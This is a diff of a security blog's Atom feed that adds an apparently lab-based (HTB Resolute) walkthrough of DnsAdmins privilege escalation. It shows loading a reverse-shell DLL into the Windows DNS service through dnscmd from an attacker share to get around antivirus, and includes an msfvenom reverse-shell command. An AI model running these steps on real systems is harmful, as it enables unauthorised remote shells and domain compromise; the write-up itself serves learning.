@@ -4,13 +4,122 @@
  <title>Spindel</title>
  <link href="https://mvineza.github.io/spindel/atom.xml" rel="self"/>
  <link href="https://mvineza.github.io/spindel/"/>
- <updated>2022-02-27T17:20:32+08:00</updated>
+ <updated>2022-03-01T18:15:35+08:00</updated>
  <id>https://mvineza.github.io</id>
  <author>
    <name>spindel</name>
    <email>rell.vineza14@yahoo.com</email>
  </author>
 
+ 
+ <entry>
+   <title>Malicious DLL Injection</title>
+   <link href="https://mvineza.github.io/spindel/2022/03/01/malicious-dll-injection"/>
+   <updated>2022-03-01T00:00:00+08:00</updated>
+   <id>https://mvineza.github.io/2022/03/01/Malicious-DLL-Injection</id>
+   <content type="html">&lt;h2 id=&quot;overview&quot;&gt;Overview&lt;/h2&gt;
+&lt;p&gt;If low privileged user is a member of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DnsAdmins&lt;/code&gt;, attacker can inject a malicuous DLL in DNS service and achieve privilege escalation.&lt;/p&gt;
+
+&lt;h2 id=&quot;environment-setup-and-requirements&quot;&gt;Environment Setup and Requirements&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;Low privileged user must be a member of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DnsAdmins&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Low privileged user must be able to start and stop DNS service&lt;/li&gt;
+  &lt;li&gt;Separate attacker windows machine for compiling DLL&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;steps&quot;&gt;Steps&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;Download this &lt;a href=&quot;https://github.com/dim0x69/dns-exe-persistance&quot;&gt;DLL DNS plugin&lt;/a&gt; and open it in attacker windows machine&lt;/li&gt;
+  &lt;li&gt;Get this &lt;a href=&quot;https://github.com/tudorthe1ntruder/reverse-shell-poc/blob/master/rs.c&quot;&gt;reverse shell&lt;/a&gt;, update it with your IP/PORT settings, and put it under sources. Ensure to add &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;#include &quot;stdafx.h&quot;&lt;/code&gt; at the top.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/spindel/assets/DNSAdmin%20Malicious%20DLL%20Injection/95AB122B-C8B0-41F0-952F-B4399E09CA94.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Create this header file&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/spindel/assets/DNSAdmin%20Malicious%20DLL%20Injection/7E830899-6043-4556-8937-60E2BAA92DC1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Update the main code. These changes below will create a new thread which help prevent crashing the DNS service.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/spindel/assets/DNSAdmin%20Malicious%20DLL%20Injection/FD577ECA-AAFC-4644-A205-6CEEB0CD09EA.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Change to “Release” and start building&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/spindel/assets/DNSAdmin%20Malicious%20DLL%20Injection/F49524CA-53B0-402B-8A2D-3BC0AFEE46B4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;DLL should be generated similar to this path. Transfer it to victim machine.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/spindel/assets/DNSAdmin%20Malicious%20DLL%20Injection/B5913B2A-E0A5-439D-ACCC-8BEFCAA2D9FE.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Open netcat listener on attacker&lt;/li&gt;
+  &lt;li&gt;Inside victim, load the DLL into DNS service and restart DNS to activate it. In this step, we are loading the DLL from attacker share to bypass some AV.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# load&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dnscmd&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/config&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/serverlevelplugindll&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;\\10.10.14.31\share\Win32Project1.dll&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+
+&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# verify&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dnscmd&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/config&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/serverlevelplugindll&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;\\10.10.14.31\share\Win32Project1.dll&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+
+&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# stop dns&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/c&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sc&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;stop&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;dns&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+
+&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# start dns&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/c&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sc&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;dns&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;troubleshooting&quot;&gt;Troubleshooting&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;For some reason, DLL generated by msfvenom doesn’t work. Seems its crashing the DNS service.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; windows/shell/reverse_tcp &lt;span class=&quot;nv&quot;&gt;LHOST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;10.10.14.31 &lt;span class=&quot;nv&quot;&gt;LPORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4444 &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; dll &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; evil.dll
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;If you encounter MFC errors during build, install the MFC libraries from Visual Studio Installer&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/spindel/assets/DNSAdmin%20Malicious%20DLL%20Injection/91D4854E-486D-411A-9732-E40C0FAACD16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;If you encounter &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;revshell: must return a value&lt;/code&gt;, add a return value at the end of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rev.cpp&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// [..redacted...]&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;WSACleanup&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;HTB Resolute&lt;/li&gt;
+  &lt;li&gt;
+    &lt;table&gt;
+      &lt;tbody&gt;
+        &lt;tr&gt;
+          &lt;td&gt;[Escalating Privileges with DNSAdmins Group&lt;/td&gt;
+          &lt;td&gt;by Nairuz Abulhul&lt;/td&gt;
+          &lt;td&gt;R3d Buck3T&lt;/td&gt;
+          &lt;td&gt;Medium](https://medium.com/r3d-buck3t/escalating-privileges-with-dnsadmins-group-active-directory-6f7adbc7005b)&lt;/td&gt;
+        &lt;/tr&gt;
+      &lt;/tbody&gt;
+    &lt;/table&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise#abuse-dns-with-dnscmd&quot;&gt;From DnsAdmins to SYSTEM to Domain Compromise&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</content>
+ </entry>
  
  <entry>
    <title>Insecure Dynamic DNS Updates</title>
